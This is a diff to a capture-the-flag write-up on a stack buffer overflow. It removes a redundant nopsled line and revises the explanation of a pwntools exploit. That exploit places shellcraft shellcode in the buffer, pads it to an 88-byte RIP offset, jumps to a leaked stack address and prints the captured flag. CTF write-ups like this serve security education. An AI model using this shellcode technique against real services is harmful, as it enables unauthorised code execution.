@@ -66,13 +66,14 @@ log.success(f'stack leak: {hex(stack_buffer)}')
 - First let's store the leak in a variable
 
 ```python
-payload = b'\x90'*10 # nopsled
 payload = asm(shellcraft.sh()) # shellcode
 payload += b'A'*(88 - len(payload)) # junk
 payload += p64(stack_buffer) # buffer base address
 ```
-- First let's put some nopsled, then append shellcode to it and fill some junk until RIP
+- let's put our shellcode at first and fill some junk until RIP
+ 
 *Note: Offset to RIP is **88*** 
+
 - Finally let's overwrite the Instruction pointer with the leaked value (our input buffer's starting address)
 
 ### Full exploit
@@ -87,7 +88,6 @@ p.recvuntil('listing at ')
 stack_buffer = int(p.recvline().replace(b'.',b''),16)
 log.success(f'stack leak: {hex(stack_buffer)}')
 
-payload = b'\x90'*10
 payload = asm(shellcraft.sh())
 payload += b'A'*(88 - len(payload))
 payload += p64(stack_buffer)
@@ -98,4 +98,5 @@ p.interactive()
 
 ![](https://i.imgur.com/XzfYQ6L.png)
 - We got our flag `1337UP{Y0u_ju5t_r3g15t3r3d_f0r_50m3_p01nt5}`
+    
     
